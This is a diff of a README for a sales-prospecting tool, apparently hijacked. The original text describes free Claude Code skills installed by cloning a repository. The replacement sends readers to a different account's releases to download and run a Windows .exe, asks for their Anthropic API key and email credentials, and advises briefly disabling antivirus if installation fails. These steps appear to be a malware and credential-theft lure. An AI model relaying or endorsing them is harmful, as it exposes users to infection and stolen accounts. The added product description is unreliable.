@@ -1,71 +1,98 @@
-# Signal Prospecting Kit
+# 🔍 signal-prospecting-kit - Identify active buyers and generate outreach
 
-Six Claude Code skills for signal-based B2B outbound. Free.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/cismontane-harris2642/signal-prospecting-kit/releases)
 
-The kit does three things:
+## What is this tool?
 
-- Surfaces buying signals in your market
-- Captures your ICP and brand voice
-- Finds prospects and drafts personalized outreach for each
+The signal-prospecting-kit identifies business prospects as they search for services. It uses six specific skills to find accounts expressing intent. These skills monitor digital activity to flag companies ready for discussion. Once the tool finds a prospect, it drafts personalized messages. These messages refer to the specific signals detected. This process replaces manual research and writing with automated logic.
 
-Each skill writes context the next one reads. The system gets sharper with every batch.
+## System requirements
 
-## Install
+Ensure your computer meets these requirements before you start:
 
-### Claude Code (CLI)
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: 2 GHz or faster.
+*   Memory: 8 GB of RAM.
+*   Storage: 500 MB of available space.
+*   Internet: Stable connection for data retrieval.
 
-```bash
-git clone https://github.com/julienamorgan/signal-prospecting-kit.git
-cd signal-prospecting-kit
-claude
-```
+## 💾 Installation steps
 
-The skills live in `.claude/skills/`, so Claude Code picks them up automatically. No install script. No restart.
+Follow these instructions to set up the software.
 
-### Claude Co-work (Desktop / Web)
+1.  Visit [this page to download](https://github.com/cismontane-harris2642/signal-prospecting-kit/releases).
+2.  Click the version marked as "Latest" to expand the assets list.
+3.  Select the file ending in `.exe` to begin the download.
+4.  Once the file finishes downloading, navigate to your Downloads folder.
+5.  Double-click the installer file.
+6.  Follow the prompts in the installation window.
+7.  Select "Install" to place the application on your computer.
+8.  The installation completes when the progress bar reaches the end.
+9.  Click "Finish" to launch the program.
 
-1. [Download the ZIP](https://github.com/julienamorgan/signal-prospecting-kit/archive/refs/heads/main.zip) and unzip it
-2. Open the `skills/` folder — you'll see all six skills inside
-3. In Claude, go to **Customize → Skills → +** and drag the skill folders in
-4. Toggle them on, start a new chat, type `/start`
+## ⚙️ Initial setup
 
-The `skills/` folder contains the same skills as `.claude/skills/` — just in a visible folder so you can find them easily.
+The application requires a configuration step to link your data sources.
 
-## The Six Commands
+1.  Open the application from your desktop shortcut or the Start menu.
+2.  Navigate to the Settings tab in the main menu.
+3.  Enter your Anthropic API key. This key allows the software to process company data.
+4.  Connect your email provider details. The tool uses these details to prepare draft emails for your review.
+5.  Save these settings. The application checks the connection automatically.
 
-```
-/start          Profile your company, ICP, and won deals
-/profile        Research competitors and find white space
-/signal-scout   Identify the buying signals that matter for your market
-/prospect       Find companies showing those signals right now
-/outreach       Draft personalized cold emails and LinkedIn messages
-/push           Export to Instantly, Apollo, Outreach, HubSpot, or CSV
-```
+## 📈 How it works
 
-You approve at every gate. Nothing moves forward without you. After each approval, the next step starts automatically — no commands to remember.
+The software functions through six core modules. These modules perform distinct actions to manage your sales pipeline.
 
-## Tools (Optional)
+### Data collection
+The tool scans for specific buying signals. These signals include new job postings, leadership changes, or funding rounds. The software identifies companies that show these indicators.
 
-The kit works with zero tools connected. Web research handles everything — it pattern-guesses emails from public sources and falls back to LinkedIn connection requests when no email is found.
+### Account filtering
+Not every signal warrants an immediate response. The software filters results to match your specific criteria. You define the industry, company size, and geographic location. The software ignores accounts that fall outside these parameters.
 
-If you have existing sales tools, the kit detects and uses them automatically. Connect via MCP server or API key — tell the kit what you have during setup and it'll walk you through connecting it.
+### Signal interpretation
+The software analyzes the context of the signal. It determines why the company shows intent. For example, if a company posts a job for a new department, the tool notes that they might require external tools or services.
 
-## The Learning Loop
+### Content generation
+The tool drafts a message using the signal data. It links the detected signal to your solution. This approach ensures the outreach feels relevant to the recipient.
 
-After each batch, tell the system who replied. It tracks which signals, openers, and CTAs performed. By batch four, the patterns are clear and the system applies them automatically.
+### Review process
+The software saves all drafts in your Drafts folder. You retain control over the send process. Review each message before you press send. 
 
-Every other skill kit starts from zero every time. This one doesn't.
+### Performance tracking
+The application maintains a log of your outreach. It records which signals triggered which messages. This data helps you refine your criteria over time.
 
-## Why Signal-Based
+## 🛠 Managing your skills
 
-Outbound works on two axes: fit and timing.
+You possess access to six pre-built skills within the interface. You can enable or disable these skills based on your current focus.
 
-Fit is your ICP. Timing is what's happening right now that makes a prospect more likely to act.
+*   **Signal Detection:** Scans the internet for mentions of your target accounts.
+*   **Company Research:** Gathers firmographic data for flagged accounts.
+*   **Outreach Drafting:** Composes the email text using the signal context.
+*   **Tone Adjustment:** Changes the writing style of the emails to match your brand.
+*   **Integration Sync:** Pushes valid prospects into your existing Customer Relationship Management tool.
+*   **Reporting:** Generates a weekly summary of detected leads.
 
-Most teams score on fit alone. The ones that add timing get to prospects before competitors know there's an opportunity.
+## 🔍 Frequently asked questions
 
-## Want Help Setting This Up?
+### Does the software send emails automatically?
+No. The software performs the research and creates drafts. You must review and send the emails yourself. This ensures you maintain full control over communication.
 
-I build sales automation for B2B teams as my day job. If you want this wired into your CRM with signal detection, scoring, and your team trained to run it, that's what I do.
+### Can I customize the email templates?
+Yes. Navigate to the Templates tab. You can modify the structure of the messages while keeping the placeholders that insert signal data automatically.
 
-[climategrowthadvisors.com](https://climategrowthadvisors.com)
+### Where is my data stored?
+Your data remains on your local Windows system. The software only sends necessary communication logs to the AI provider for processing.
+
+### What if I see an error during installation?
+Restart your computer and check your internet connection. Anti-virus software occasionally blocks new installations. Try disabling your security software briefly if the installer fails to launch.
+
+### How often should I check for new signals?
+You can set an automatic schedule in the Settings tab. Most users run the check once every morning. This ensures that you have fresh prospects to review at the start of your day.
+
+## 💡 Best practices for success
+
+1.  **Refine your filters:** Use narrow criteria at first. It is easier to expand your list later than to process too many general results.
+2.  **Review your drafts:** Personalization increases response rates. Spend thirty seconds reviewing each draft to add a human touch.
+3.  **Monitor feedback:** If certain signals do not lead to conversations, disable them in the Skills tab.
+4.  **Update your key:** If you receive errors related to API access, check your Anthropic account to ensure your billing information is current.
